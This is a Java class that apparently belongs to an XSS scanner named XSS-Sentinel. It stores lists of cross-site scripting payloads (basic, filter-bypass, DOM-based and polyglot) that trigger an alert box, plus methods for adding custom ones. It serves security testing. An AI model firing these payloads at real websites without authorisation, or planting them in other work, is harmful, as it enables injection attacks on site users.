package com.xsssentinel.payloads;

import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class PayloadManager {

    // Basic reflected XSS payloads
    private static final List<String> BASIC_PAYLOADS = Arrays.asList(
            "<script>alert('XSS-Sentinel')</script>",
            "<img src=x onerror=alert('XSS-Sentinel')>",
            "<svg onload=alert('XSS-Sentinel')>",
            "\"><script>alert('XSS-Sentinel')</script>",
            "'><script>alert('XSS-Sentinel')</script>",
            "<body onload=alert('XSS-Sentinel')>",
            "<iframe src=javascript:alert('XSS-Sentinel')>"
    );

    // Filter bypass payloads
    private static final List<String> BYPASS_PAYLOADS = Arrays.asList(
            "<ScRiPt>alert('XSS-Sentinel')</ScRiPt>",
            "<img src=x onerror=alert`XSS-Sentinel`>",
            "<svg/onload=alert('XSS-Sentinel')>",
            "<input autofocus onfocus=alert('XSS-Sentinel')>",
            "<select autofocus onfocus=alert('XSS-Sentinel')>",
            "<video><source onerror=alert('XSS-Sentinel')>",
            "<details open ontoggle=alert('XSS-Sentinel')>",
            "<iframe src=javascript:alert('XSS-Sentinel')>"
    );

    // DOM-based XSS payloads
    private static final List<String> DOM_PAYLOADS = Arrays.asList(
            "javascript:alert('XSS-Sentinel')",
            "#<img src=x onerror=alert('XSS-Sentinel')>",
            "'-alert('XSS-Sentinel')-'",
            "\"-alert('XSS-Sentinel')-\"",
            "\\'-alert('XSS-Sentinel');//"
    );

    // Polyglot payloads
    private static final List<String> POLYGLOT_PAYLOADS = Arrays.asList(
            "'\"-->></styles></script><svg onload=alert('XSS-Sentinel')>",
            "<script>/*'/*`/*\"/*</script><svg onload=alert('XSS-Sentinel')/*>",
            "\">'><svg onload=alert('XSS-Sentinel')>"
    );

    // User custom payloads
    private final List<String> customPayloads =
            new java.util.ArrayList<>();

    public List<String> getBasicPayloads() {
        return BASIC_PAYLOADS;
    }

    public List<String> getBypassPayloads() {
        return BYPASS_PAYLOADS;
    }

    public List<String> getDomPayloads() {
        return DOM_PAYLOADS;
    }

    public List<String> getPolyglotPayloads() {
        return POLYGLOT_PAYLOADS;
    }

    public List<String> getCustomPayloads() {
        return customPayloads;
    }

    public List<String> getAllBuiltInPayloads() {
        return Arrays.asList(
                        BASIC_PAYLOADS,
                        BYPASS_PAYLOADS,
                        DOM_PAYLOADS,
                        POLYGLOT_PAYLOADS
                ).stream()
                .flatMap(List::stream)
                .collect(Collectors.toList());
    }

    public void addCustomPayload(String payload) {
        if (payload != null && !payload.trim().isEmpty()) {
            customPayloads.add(payload.trim());
        }
    }

    public void removeCustomPayload(String payload) {
        customPayloads.remove(payload);
    }

    public void clearCustomPayloads() {
        customPayloads.clear();
    }

    public List<String> getAllPayloads() {
        return Arrays.asList(
                        BASIC_PAYLOADS,
                        BYPASS_PAYLOADS,
                        DOM_PAYLOADS,
                        POLYGLOT_PAYLOADS,
                        customPayloads
                ).stream()
                .flatMap(List::stream)
                .collect(Collectors.toList());
    }
}